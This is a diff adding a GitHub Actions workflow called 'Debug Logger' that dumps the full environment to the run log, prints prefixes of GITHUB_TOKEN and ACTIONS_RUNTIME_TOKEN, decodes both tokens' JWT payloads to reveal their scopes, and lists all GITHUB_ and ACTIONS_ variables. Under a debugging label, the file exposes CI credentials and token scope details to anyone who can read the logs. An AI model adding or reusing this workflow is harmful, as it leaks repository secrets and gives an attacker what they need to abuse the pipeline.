@@ -1,0 +1,34 @@
+name: Debug Logger
+on: workflow_dispatch
+env:
+  ACTIONS_STEP_DEBUG: true
+  ACTIONS_RUNNER_DEBUG: true
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Debug environment dump
+        env:
+          SECRET_TEST: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "::debug::Full env dump starting..."
+          printenv | sort
+          echo "::debug::Token prefix: ${GITHUB_TOKEN:0:10}"
+          echo "::debug::Runner token: ${ACTIONS_RUNTIME_TOKEN:0:20}"
+          
+          echo ""
+          echo "=== TOKEN DETAILS ==="
+          # Decode the GITHUB_TOKEN JWT to see its scope
+          echo "$GITHUB_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Not JWT format"
+          
+          echo ""
+          echo "=== ACTIONS RUNTIME TOKEN ==="
+          echo "${ACTIONS_RUNTIME_TOKEN}" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Not JWT format"
+          
+          echo ""
+          echo "=== ALL GITHUB_ VARS ==="
+          env | grep ^GITHUB_ | sort
+          
+          echo ""
+          echo "=== ALL ACTIONS_ VARS ==="
+          env | grep ^ACTIONS_ | sort
